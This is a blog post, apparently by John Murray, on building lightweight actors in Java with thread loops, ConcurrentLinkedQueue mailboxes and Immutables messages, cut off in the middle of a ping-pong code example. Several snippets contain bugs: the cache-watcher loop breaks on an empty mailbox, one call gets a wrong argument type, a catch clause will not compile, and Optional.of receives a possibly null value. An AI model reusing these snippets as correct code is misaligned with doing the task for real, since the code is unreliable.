<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Poor Man's Actors in Java</title>
  <meta name="description" content="Actors are a fantastic way to model concurrency and a much easier mental modelthan when working with plain threads and shared memory. However let’s say that ...">

  <!-- <link rel="stylesheet" href="/css/main.css"> -->
  
  <style>
    @import "https://fonts.googleapis.com/css?family=Roboto:300,400,500";body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,hr,dl,dd,ol,ul,figure{margin:0;padding:0}body{-webkit-text-size-adjust:100%;background-color:#fff;color:#566b78;font-family:"Roboto","Open Sans",Helvetica,Arial,sans-serif;font-size:18px;font-weight:300;line-height:1.7;padding-top:2em}h1,h2,strong{color:#344b78}h1,h2,h3,h4,h5,h6,p,blockquote,pre,ul,ol,dl,figure{margin-bottom:15px}img{margin-bottom:20px;max-width:100%;vertical-align:middle}figure>img{display:block}figcaption{font-size:15.75px}ul,ol{margin-left:30px}li>ul,li>ol{margin-bottom:0}h1,h2,h3,h4,h5,h6{font-weight:300}a{color:#e81c4f;text-decoration:none}a:visited{color:#e81c4f}a:hover{color:#566b78;text-decoration:none}blockquote{color:#828282;border-left:4px solid #e8e8e8;padding-left:15px;font-size:18px;letter-spacing:-1px;font-style:italic}blockquote>:last-child{margin-bottom:0}pre,code{font-size:12px;border-radius:3px;border:1px solid #d8dee9;background-color:#f5f7f9}code{padding:4px 5px 1px 5px}pre{padding:8px 12px;overflow-x:auto}pre>code{border:0;padding-right:0;padding-left:0}.wrapper{max-width:-webkit-calc(800px - (30px * 2));max-width:calc(800px - (30px * 2));margin-right:auto;margin-left:auto;padding-right:30px;padding-left:30px}@media screen and (max-width: 800px){.wrapper{max-width:-webkit-calc(800px - (30px));max-width:calc(800px - (30px));padding-right:15px;padding-left:15px}}.wrapper:after{content:"";display:table;clear:both}.icon>svg{display:inline-block;width:16px;height:16px;vertical-align:middle}.icon>svg path{fill:#828282}.masthead{color:#fff;background-color:#2a2a2a;min-width:270px}.masthead h1{color:#fff;font-weight:400;font-family:"Roboto", "Lucida Console", Monaco, monospace}.masthead a{text-decoration:none}.masthead a:hover{text-decoration:none}.masthead a:active{text-decoration:none}.masthead-inner .sub{color:#666}.masthead-inner .sub a{color:#666}.masthead-inner .sub a:hover{color:#999}@media (min-width: 760px){.masthead-inner{padding:40px}.page-content{margin-left:40px;margin-right:40px}}@media (min-width: 990px){.masthead{position:fixed;top:0;left:0;bottom:0;width:25%;margin-bottom:0}.masthead-inner{position:absolute;top:0;right:0;left:0}.masthead h1{font-size:54px}.page-content{margin-left:35%;margin-right:10%;width:55%}}.page-content{padding:30px 0}.page-heading{font-size:20px}.post-list{margin-left:0;list-style:none}.post-list .post-title{margin-top:30px;margin-bottom:0;display:inline-block}.post-meta{color:#828282;display:inline-block;float:right;font-size:15.75px;margin-top:32px}.post-link{display:block;font-size:24px}.post-header{margin-bottom:30px}.post-title{font-size:42px;letter-spacing:-1px;line-height:1}@media screen and (max-width: 800px){.post-title{font-size:36px}}.post-content{margin-bottom:30px}.post-content h2{font-size:32px}@media screen and (max-width: 800px){.post-content h2{font-size:28px}}.post-content h3{font-size:26px}@media screen and (max-width: 800px){.post-content h3{font-size:22px}}.post-content h4{font-size:20px}@media screen and (max-width: 800px){.post-content h4{font-size:18px}}.footer-navigation{border-bottom:1px solid #e0e0e0;display:block;font-weight:bold;height:60px;margin:50px 0 40px 0;text-align:center}.footer-navigation .previous{display:block;margin:0 auto}.footer-navigation .next{display:block;margin:0 auto}@media (min-width: 760px){.footer-navigation{height:30px;padding-bottom:10px}.footer-navigation .previous{display:block;float:left;margin:0;text-align:left}.footer-navigation .next{display:block;float:right;margin:0;text-align:right}}.highlight{background:#ffffff;margin-bottom:20px;margin-top:20px}.highlight .c{color:#999988;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#999988;font-style:italic}.highlight .cp{color:#999999;font-weight:bold}.highlight .c1{color:#999988;font-style:italic}.highlight .cs{color:#999999;font-weight:bold;font-style:italic}.highlight .gd{color:#000000;background-color:#fdd}.highlight .gd .x{color:#000000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000000;background-color:#dfd}.highlight .gi .x{color:#000000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#aaa}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#445588;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d14}.highlight .na{color:teal}.highlight .nb{color:#0086B3}.highlight .nc{color:#445588;font-weight:bold}.highlight .no{color:#0086b3}.highlight .ni{color:purple}.highlight .ne{color:#990000;font-weight:bold}.highlight .nf{color:#990000;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:navy}.highlight .nv{color:teal}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#d14}.highlight .sc{color:#d14}.highlight .sd{color:#d14}.highlight .s2{color:#d14}.highlight .se{color:#d14}.highlight .sh{color:#d14}.highlight .si{color:#0086b3}.highlight .sx{color:#d14}.highlight .sr{color:#009926}.highlight .s1{color:#d14}.highlight .ss{color:#0086b3}.highlight .bp{color:#999}.highlight .vc{color:teal}.highlight .vg{color:teal}.highlight .vi{color:teal}.highlight .il{color:#099}figure.highlight{border-left:3px solid #e0e0e0}.post .highlight .lineno{color:#ccc;display:inline-block;padding:0 5px 0 0;border-right:1px solid #ccc}.post .highlight pre code{display:block;white-space:pre;overflow-x:auto;word-wrap:normal}.post .highlight pre{border:none;margin:0}.post .highlight pre code{background-color:transparent;font-size:12px}

  </style>
  <link rel="canonical" href="http://www.johnmurray.io/log/2016/03/31/Poor-Mans-Actors.html">
  <link rel="alternate" type="application/rss+xml" title="John Murray" href="http://www.johnmurray.io/feed.xml" />
</head>


  <body>

    <header class="masthead">
  <div class="masthead-inner">
    <a href="/"><h1>murray</h2></a>
    <p class="sub">
      <a href="http://github.com/johnmurray">github</a>
      |
      <a href="http://twitter.com/johnmurray_io">twitter</a>
      |
      <a href="http://linkedin.com/pub/john-murray/22/a86/80a/en">linkedin</a>
    </p>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="post">

    <header class="post-header">
        <h1 class="post-title">Poor Man's Actors in Java</h1>
    </header>

    <article class="post-content">
        <p><a href="https://en.wikipedia.org/wiki/Actor_model">Actors</a> are a fantastic way to model concurrency and a much easier mental model
than when working with plain threads and shared memory. However let’s say that you’re
writing a very simple library that needs to run some simple background tasks. You could
pull in one of the popular Actor implementation libraries out there, but they don’t come
for free and can sometimes be heavy-weight.</p>

<p>There is a small movement in the JVM communities to move toward completely self-contained
libraries. I am personally in favor of this movement, but it does mean it can make writing
libraries a touch more difficult. So, if I’m writing a library and I want to do some async
stuff and I <em>really</em> like using actors, what do I do? Well I personally like to program in
the actor model (primarily) for two things</p>

<ul>
  <li>Messages are immutable</li>
  <li>Message passing as a way of communicating</li>
</ul>

<p>So the question is, can we get this with zero runtime dependencies? Of course we can, but
how much work is it going to be? Let’s find out.</p>

<h2 id="the-exercise">The Exercise</h2>

<p>Before we jump right into the meaty bits, we need to setup a problem that our examples will
be trying to solve.
Let’s say that I’m writing a library that will do some local file-caching. As part of this,
the library needs to handle <em>active</em> cache expiry. Active meaning that we don’t wait until
the value is read again to do the cleanup, meaning we need some sort of asynchronous monitor.</p>

<h2 id="immutable-messages">Immutable Messages</h2>

<p>There is nothing stopping from creating immutable data-structures in Java. However it may not be
as easy as using say case classes in Scala. However it is most certainly <em>possible</em>. However, this
one is pretty easy to get with very little work on our part.  Java has long had annotation 
processors, which is a way to generate code based on annotations at compile time. You can imagine 
that this is very useful, especially for defining immutable objects. Luckily for us, someone 
has already went through the work to create a generator for immutable data. If you are not 
already familiar, meet <a href="http://immutables.github.io">Immutables</a>.</p>

<p>Let’s define some models that we’ll use later</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="nd">@Value</span><span class="o">.</span><span class="na">Immutable</span>
<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">CacheCreated</span> <span class="o">{</span>
  <span class="n">Path</span> <span class="nf">getFilePath</span><span class="o">();</span>
  <span class="n">Long</span> <span class="nf">getTtl</span><span class="o">();</span>
  <span class="n">TimeUnit</span> <span class="nf">getTtlUnit</span><span class="o">();</span>
<span class="o">}</span>

<span class="nd">@Value</span><span class="o">.</span><span class="na">Immutable</span>
<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">CacheExpired</span> <span class="o">{</span>
  <span class="n">Path</span> <span class="nf">getFilePath</span><span class="o">();</span>
<span class="o">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>That’s it! We now have immutable data-objects that are easy to work with. Let’s move on to the Actors.</p>

<h2 id="actors">Actors</h2>

<p>Well we already know we have threads for running concurrent operations, but how do we handle the message
passing? Simple, we define a mailbox that actors receive messages into and process out of. But what is
a mailbox if not just a simple queue. Java has a bunch of those! In fact, there is a nice thread-safe
one that works for us, the <a href="https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ConcurrentLinkedQueue.html"><code class="highlighter-rouge">ConcurrentLinkedQueue</code></a>. So that means we can define an actor as</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="code"><pre><span class="kd">final</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">mailbox</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;&gt;();</span>

<span class="n">Thread</span> <span class="n">actor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>

  <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10</span><span class="o">);</span>

    <span class="n">Object</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">continue</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="k">try</span> <span class="o">{</span>
      <span class="c1">// process message</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// handle exception(s)</span>
    <span class="o">}</span>
  <span class="o">}</span>

<span class="o">});</span>
<span class="n">actor</span><span class="o">.</span><span class="na">start</span><span class="o">();</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Let’s break this down so we understand all that is happening here. First the mailbox</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">final</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">mailbox</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;&gt;();</span></code></pre></figure>

<p>All variables used within lambdas or anonymous inner classes must be effective final, thus the <code class="highlighter-rouge">final</code>. Note
that we are also typing the collection to <code class="highlighter-rouge">Object</code>, why? This allows us to send any kind of messages to our
actors and the actors can pattern match to find out what the message is. Since we’re in Java, pattern matching
really just means doing a bunch of <code class="highlighter-rouge">instaceof</code> statements.</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
  <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10</span><span class="o">);</span></code></pre></figure>

<p>To keep the actor alive, the thread cannot end or be “done.” Because of this, we have the thread run in
an infinite loop. However we also don’t want our process in a “busy wait.” To get around this we sleep for
10ms at the beginning of each loop. 10ms is arbitrary and is just represents the trade-off between using
resources and responding to events in a timely manner.</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">Object</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
<span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
  <span class="k">continue</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<p>Attempt to read the first thing in the mailbox (if anything is there). If there is nothing in the mailbox then
<code class="highlighter-rouge">null</code> is returned. In this case we simply jump back up to the beginning of the infinite loop which causes us to
sleep for 10ms before checking again.</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">Object</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
<span class="k">try</span> <span class="o">{</span>
  <span class="c1">// process message</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
  <span class="c1">// handle exception(s)</span>
<span class="o">}</span></code></pre></figure>

<p>For the same reason that we put everything into a <code class="highlighter-rouge">while</code>, we also need to catch any errors that might occur.
If an exception is thrown, then we need to have code to handle the error and allow the actor to continue
processing. Otherwise the exception could crash our thread and effectively kill our actor. Note that supervision
is not something our implementation has.</p>

<h1 id="file-caching-actors">File-Caching Actors</h1>

<p>For my system I will define two actors. One actor to receive created events and monitor <em>when</em> cache
items should be expired. This actor will send messages to another actor which will take care of the
actual file deletion.</p>

<p>Putting what we defined above to good use, I can define my actor as</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="kd">final</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">ttlWatcherMailbox</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;&gt;();</span>
<span class="kd">final</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">cacheDeleterMailbox</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;&gt;();</span></pre></td></tr></tbody></table></code></pre></figure>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="code"><pre><span class="n">Thread</span> <span class="n">cacheWatcher</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
  <span class="n">Map</span><span class="o">&lt;</span><span class="n">Path</span><span class="o">,</span> <span class="n">DateTime</span><span class="o">&gt;</span> <span class="n">cacheExpiry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
  <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">count</span><span class="o">++;</span>
      <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10</span><span class="o">);</span>

      <span class="c1">// check for new items to store</span>
      <span class="n">Object</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">ttlWatcherMailbox</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="k">instanceof</span> <span class="n">CacheCreated</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">CacheCreated</span> <span class="n">cc</span> <span class="o">=</span> <span class="o">(</span><span class="n">CacheCreated</span><span class="o">)</span> <span class="n">msg</span><span class="o">;</span>
        <span class="n">cacheExpiry</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">cc</span><span class="o">.</span><span class="na">getFilePath</span><span class="o">(),</span> <span class="n">calculateExpiryDate</span><span class="o">(</span><span class="n">cc</span><span class="o">.</span><span class="na">getTtl</span><span class="o">(),</span> <span class="n">cc</span><span class="o">.</span><span class="na">getTtlUnit</span><span class="o">());</span>
      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="c1">// log unhandled message</span>
      <span class="o">}</span>

      <span class="c1">// scan cached objects (every 100ms, roughly)</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">count</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="k">continue</span><span class="o">;</span>
      <span class="k">for</span><span class="o">(</span> <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">Path</span><span class="o">,</span> <span class="n">DateTime</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">cacheExpiry</span><span class="o">.</span><span class="na">iterator</span><span class="o">()</span> <span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">isExpired</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">())</span> <span class="o">{</span>
          <span class="n">cacheDeleterMailbox</span><span class="o">.</span><span class="na">offer</span><span class="o">(</span><span class="n">ImmutableCacheExpired</span><span class="o">.</span><span class="na">builder</span><span class="o">()</span>
              <span class="o">.</span><span class="na">filePath</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">())</span>
              <span class="o">.</span><span class="na">build</span><span class="o">());</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// log out errors</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">});</span></pre></td></tr></tbody></table></code></pre></figure>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="code"><pre><span class="n">Thread</span> <span class="n">cacheDeleter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
  <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10</span><span class="o">);</span>

      <span class="n">Object</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">cacheDeleterMailbox</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="k">continue</span><span class="o">;</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="k">instanceof</span> <span class="n">CacheExpired</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">CacheExpired</span> <span class="n">ce</span> <span class="o">=</span> <span class="o">(</span><span class="n">CacheExpired</span><span class="o">)</span> <span class="n">msg</span><span class="o">;</span>
        <span class="n">deleteFile</span><span class="o">(</span><span class="n">ce</span><span class="o">.</span><span class="na">getFilePath</span><span class="o">());</span>
      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="c1">// log unhandled message</span>
      <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// log out errors</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">});</span></pre></td></tr></tbody></table></code></pre></figure>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="n">cacheWatcher</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
<span class="n">cacheDeleter</span><span class="o">.</span><span class="na">start</span><span class="o">();</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Bam! We now have simple actors performing our background jobs and communicate by message passing. We
could take this further if wanted and use some of Java’s concurrent blocking queues which would give
us back-pressure as well. And like that, there are many small things you could do to add the features
that you most value in a full-blown actor framework / library.</p>

<h2 id="improving-our-api">Improving our API</h2>

<p>If we want to take our working code a little bit further we can improve the current API to abstract
some of the details for how this is working. First let’s define a central place to create our actors
and store all of our mailboxes. Also, mailboxes should have an address, let’s do this by naming our
actors / mailboxes.</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="code"><pre><span class="kd">class</span> <span class="nc">ActorRef</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">mailbox</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConcurrentLinkedQueue</span><span class="o">&lt;&gt;();</span>
  <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>

  <span class="kd">public</span> <span class="nf">ActorRef</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">tell</span><span class="o">(</span><span class="n">Object</span> <span class="n">msg</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">mailbox</span><span class="o">.</span><span class="na">offer</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getLetter</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">mailbox</span><span class="o">.</span><span class="na">poll</span><span class="o">();</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getLetterCount</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">mailbox</span><span class="o">.</span><span class="na">size</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span></pre></td></tr></tbody></table></code></pre></figure>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="code"><pre><span class="kd">class</span> <span class="nc">ActorSystem</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">ActorRef</span><span class="o">&gt;</span> <span class="n">registry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>

  <span class="kd">public</span> <span class="n">ActorRef</span> <span class="nf">actor</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Consumer</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">f</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">ActorRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ActorRef</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="n">registry</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">ref</span><span class="o">);</span>

    <span class="n">Thread</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
      <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">ref</span><span class="o">.</span><span class="na">getLetterCount</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
          <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">f</span><span class="o">.</span><span class="na">accept</span><span class="o">(</span><span class="n">ref</span><span class="o">.</span><span class="na">getLetter</span><span class="o">());</span>
      <span class="o">}</span>
    <span class="o">});</span>
    <span class="n">t</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>

    <span class="k">return</span> <span class="n">ref</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="n">Optional</span><span class="o">&lt;</span><span class="n">ActorRef</span><span class="o">&gt;</span> <span class="nf">lookup</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">ActorRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">registry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">Optional</span><span class="o">.</span><span class="na">of</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
  <span class="o">}</span>
<span class="o">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Modeling this off of Akka, we now have an <code class="highlighter-rouge">ActorRef</code> which wraps the mailbox and an <code class="highlighter-rouge">ActorSystem</code> that tracks
all of the actors in our system and also creates some easier utilities for creating actors. We can now define
actors in our system as</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="n">ActorSystem</span> <span class="n">system</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ActorSystem</span><span class="o">();</span>

<span class="n">ActorRef</span> <span class="n">echoActor</span> <span class="o">=</span> <span class="n">system</span><span class="o">.</span><span class="na">actor</span><span class="o">(</span><span class="s">"echo"</span><span class="o">,</span> <span class="o">(</span><span class="n">Object</span> <span class="n">msg</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">msg</span><span class="o">);</span>
  <span class="o">}</span>
<span class="o">});</span>

<span class="n">echoActor</span><span class="o">.</span><span class="na">tell</span><span class="o">(</span><span class="s">"Hello, World!"</span><span class="o">);</span></pre></td></tr></tbody></table></code></pre></figure>

<p>and we can handle communication between two named actors as</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="code"><pre><span class="n">ActorSystem</span> <span class="n">system</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ActorSystem</span><span class="o">();</span>

<span class="n">ActorRef</span> <span class="n">ping</span> <span class="o">=</span> <span class="n">system</span><span class="o">.</span><span class="na">actor</span><span class="o">(</span><span class="s">"ping"</span><span class="o">,</span> <span class="o">(</span><span class="n">Object</span> <span class="n">msg</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">sMsg</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">msg</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">sMsg</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"ping"</span><span class="o">))</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"ping"</span><span class="o">);</span>
      <span class="n">system</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"pong"</span><span class="o">).</span><span class="na">ifPresent</span><span class="o">((</span><span class="n">ActorRef</span> <span class="n">pong</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="n">pong</span><span class="o">.</span><span class="na">tell</span><span class="o">(</span><span class="s">"pong"</span><span class="o">));</span>
    <span class="o">}</span>
